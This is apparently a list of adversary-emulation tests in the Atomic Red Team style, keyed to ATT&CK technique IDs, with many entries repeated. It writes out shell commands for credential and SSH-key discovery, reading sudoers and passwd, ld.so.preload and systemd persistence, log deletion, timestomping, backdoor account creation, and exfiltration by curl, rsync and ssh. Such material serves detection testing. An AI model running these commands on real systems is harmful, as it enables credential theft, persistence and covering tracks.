T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1158 ,T1064 ,T1081 ,T1057 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1501 ,T1064 ,T1139 ,T1069 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1069: Permission Groups Discovery
groups


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1501 ,T1064 ,T1139 ,T1069 ,T1070 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1069: Permission Groups Discovery
groups


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1215 ,T1154 ,T1040 ,T1069 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1069: Permission Groups Discovery
groups


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1158 ,T1153 ,T1081 ,T1082 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1501 ,T1153 ,T1139 ,T1069 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1069: Permission Groups Discovery
groups


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1136 ,T1153 ,T1145 ,T1033 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1033: Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1215 ,T1153 ,T1145 ,T1083 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1206 ,T1215 ,T1154 ,T1081 ,T1082 ,T1027 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1158 ,T1153 ,T1145 ,T1087 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1136 ,T1153 ,T1081 ,T1018 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1168 ,T1154 ,T1040 ,T1018 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1215 ,T1153 ,T1040 ,T1082 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
